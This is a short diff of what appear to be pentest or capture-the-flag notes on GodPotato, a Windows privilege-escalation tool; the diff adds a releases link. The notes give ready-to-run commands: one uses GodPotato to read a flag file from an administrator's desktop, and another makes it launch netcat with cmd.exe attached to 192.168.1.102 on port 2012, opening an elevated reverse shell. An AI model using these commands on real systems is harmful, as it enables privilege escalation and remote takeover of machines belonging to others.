@@ -1,4 +1,5 @@
 https://github.com/BeichenDream/GodPotato
+https://github.com/BeichenDream/GodPotato/releases
 
 .\godpotato.exe -cmd "cmd /c \"type C:\users\admin\desktop\flag.txt\""
 .\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
